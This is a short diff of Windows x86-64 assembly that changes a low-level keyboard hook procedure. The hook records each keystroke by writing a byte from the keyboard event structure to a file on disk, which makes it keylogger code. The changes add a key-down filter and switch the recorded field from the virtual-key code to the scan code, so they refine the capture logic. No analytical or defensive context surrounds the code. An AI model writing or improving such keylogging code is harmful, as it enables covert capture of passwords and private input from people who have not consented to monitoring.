@@ -47,13 +47,16 @@ proc LowLevelKeyboardProc
 	sub rsp,8
        retn
     processhook:
+    cmp rdx, WM_KEYDOWN
+	jnz	return2
        mov	rbx,r8
-	mov	rbx,qword [rbx+00h]
+	mov	rbx,qword [rbx+4h]
 	mov	[buffer],bl
     invoke fopen, filename, filemode
     mov [fp],rax
     invoke  fwrite, buffer, 1, 1, [fp]
     invoke  fclose,[fp]
+    return2:
 ret
 endp
 include 			'\INCLUDE\API\KERNEL32.INC'
